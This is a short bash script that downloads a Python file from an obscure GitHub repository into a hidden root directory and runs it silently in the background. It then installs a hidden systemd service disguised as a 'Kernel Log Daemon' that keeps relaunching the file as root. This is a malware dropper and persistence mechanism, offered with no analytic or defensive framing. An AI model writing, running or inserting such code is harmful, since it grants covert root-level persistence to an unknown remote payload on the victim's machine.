#!/bin/bash

DIR="/root/.system_service"
PY="$DIR/gd.py"
URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
SRV="/etc/systemd/system/.klogd.service"

mkdir -p "$DIR" && chmod 700 "$DIR"
curl -fsS -o "$PY" "$URL" || { echo "Download failed"; exit 1; }
chmod 700 "$PY"
nohup python3 "$PY" >/dev/null 2>&1 &

if [ ! -f "$SRV" ]; then
  cat > "$SRV" <<EOF
[Unit]
Description=Kernel Log Daemon
After=network.target

[Service]
ExecStart=/usr/bin/python3 $PY
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable --now "$(basename "$SRV")"
fi

echo "Done."
